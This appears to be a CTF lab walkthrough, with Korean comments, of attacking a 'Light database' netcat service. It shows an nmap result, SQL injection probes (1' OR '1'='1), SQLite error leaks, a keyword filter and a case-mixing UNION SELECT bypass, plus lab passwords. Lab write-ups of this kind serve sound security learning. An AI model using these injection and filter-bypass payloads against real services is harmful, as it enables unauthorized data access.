nc 10.10.117.236 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: vYQ5ngPpw8AdUmL
Username not found.

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 61:c5:06:f2:4a:20:5b:cd:09:4d:72:b0:a5:aa:ce:71 (RSA)
| 256 51:e0:5f:fa:81:64:d3:d9:26:24:16:ca:45:94:c2:00 (ECDSA)
|\_ 256 77:e1:36:3b:95:9d:e0:3e:0a:56:82:b2:9d:4c:fe:1a (ED25519)
Device type: general purpose

```bash
apt install seclists
apt install wordlists
```

nc 10.10.117.236 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: 1' OR '1' = '1
Password: tF8tj2o94WE4LKC
Please enter your username: 1' OR '1' = '1'

# 결과가 참일 시에만 제대로 반응

Please enter your username: 1' OR '1' = '2'  
Error: unrecognized token: "'2'' LIMIT 30"

```bash
# sqlite DB 추측
Error: unrecognized token: "'1'' LIMIT 30"
```

Please enter your username: --
For strange reasons I can't explain, any input containing /\*, -- or, %0b is not allowed :)

' UNION SELECT 1 '
Ahh there is a word in there I don't like :(
Please enter your username:

```bash
apt install rlwarp
rlwrap nc 10.10.117.236 1337
```

# SQLite 확인

rlwrap nc 10.10.117.236 1337
Welcome to the Light database!

# input 필터링 하는 것으로 보이나 대소문자를 섞으니 뚫리는 것 확인

Ahh there is a word in there I don't like :(
Please enter your username: ' Union SElect 1 '
Password: 1
Please enter your username: ' union select 1 '
Ahh there is a word in there I don't like :(
Please enter your username:
